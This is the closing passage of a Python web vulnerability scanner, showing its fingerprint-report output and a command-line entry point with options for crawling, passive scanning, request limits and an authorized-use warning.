        if fingerprint.get('cookie_issues'):
            print(f"- Cookie Security Issues:")
            for issue in fingerprint['cookie_issues']:
                print(f"  - {Fore.YELLOW}{issue}{Style.RESET_ALL}")
        else:
            print(f"- Cookie Security: No issues detected")

        print(f"- SSL Enabled: {fingerprint['ssl_enabled']}")
        print(f"- Robots.txt: {fingerprint['robots_txt']}")
        if 'robots_disallowed' in fingerprint and fingerprint['robots_disallowed']:
            print(f"  - Disallowed Paths: {', '.join(fingerprint['robots_disallowed'][:5])}")
        print(f"- Sitemap.xml: {fingerprint['sitemap_xml']}")
        
        if fingerprint['hardening_tips']:
            print(f"- Hardening Tips:")
            for tip in fingerprint['hardening_tips']:
                print(f"  - {tip}")
        
        print(f"- Risk Score: {fingerprint['risk_score']}/100")
        
        if fingerprint['recommendations']:
            print(f"- Recommendations:")
            for rec in fingerprint['recommendations']:
                print(f"  - {rec}")
        
        if args.export_fingerprint:
            with open(args.export_fingerprint, 'w', encoding='utf-8') as f:
                json.dump(fingerprint, f, indent=2)
            print(f"\nFingerprint exported to {args.export_fingerprint}")


def main():
    """Main function to run the scanner."""
    parser = argparse.ArgumentParser(
        description="Common Web Application Vulnerability Scanner"
    )
    parser.add_argument("target", help="URL or IP address to scan")
    parser.add_argument("--output", help="Output file (JSON or CSV)")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--max-pages", type=int, default=5, help="Maximum number of pages to crawl")
    parser.add_argument("--max-requests", type=int, default=500, help="Maximum number of requests to make")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests (seconds)")
    parser.add_argument("--passive", action="store_true", help="Perform only passive scanning")
    parser.add_argument("--user-agent", help="Custom user agent string")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://proxy:port)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
    parser.add_argument("--vuln-file", help="Path to custom vulnerabilities JSON file")
    parser.add_argument("--log-file", help="Path to log file")
    parser.add_argument("--export-fingerprint", help="Export fingerprint to JSON file")
    parser.add_argument("--profile", choices=["fast", "thorough"], help="Scan profile: fast (passive, 1 page) or thorough (active, 10 pages)")
    parser.add_argument("--min-severity", choices=["low", "medium", "high", "critical"], default="low", help="Minimum severity level to report")
    args = parser.parse_args()

    if args.profile == 'fast':
        args.passive = True
        args.max_pages = 1
    elif args.profile == 'thorough':
        args.passive = False
        args.max_pages = 10

    setup_logging(args.debug, args.log_file)
    
    init()
    print(Fore.CYAN + load_banner() + Style.RESET_ALL)
    print("\n" + Fore.YELLOW + "THESE RESULTS MAY NOT BE 100% CORRECT!" + Style.RESET_ALL)
    print(Fore.MAGENTA + "Developed By " + Fore.CYAN + "SirCryptic" + Style.RESET_ALL + "\n")
    print(Fore.RED + "Use only on systems you are authorized to test." + Style.RESET_ALL)

    try:
        scanner = WebVulnScanner(request_delay=args.delay, custom_ua=args.user_agent, proxy=args.proxy, passive=args.passive, no_verify=args.no_verify, vuln_file=args.vuln_file, max_requests=args.max_requests)
        logger.info("Scanning target: %s", args.target)
        
        start_time = time.time()
        scanner.waf_detected = scanner.detect_waf(args.target)
        
        pages = scanner.crawl_pages(args.target, max_pages=args.max_pages)
        if not pages:
            logger.error("No pages successfully crawled from %s", args.target)
            sys.exit(1)

        print("Checking vulnerabilities across crawled pages...")
        results = scanner.check_vulnerabilities(pages)
        severity_order = {'low': 0, 'medium': 1, 'high': 2, 'critical': 3}
        min_rank = severity_order[args.min_severity]
        results = [r for r in results if severity_order.get(r[4], 1) >= min_rank]
        end_time = time.time()
        reporter = Reporter()
        reporter.display_results(results, scanner.waf_detected, scanner.requests_count, end_time - start_time)
        
        if args.output:
            reporter.export_results(results, args.output)

        print(f"\nScan completed in {end_time - start_time:.2f} seconds.")
        print(f"Total requests made: {scanner.requests_count}")
        
        if pages:
            reporter.display_fingerprint(scanner, pages[0], args.target, args)

    except RuntimeError as e:
        if "Max requests exceeded" in str(e):
            print(f"\nMax request limit ({args.max_requests}) reached, stopping scan early.")
        else:
            print(f"\nError: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "Scan interrupted. Thank you for using cwv-scanner by SirCryptic!" + Style.RESET_ALL)
        sys.exit(0)

if __name__ == "__main__":
    main()
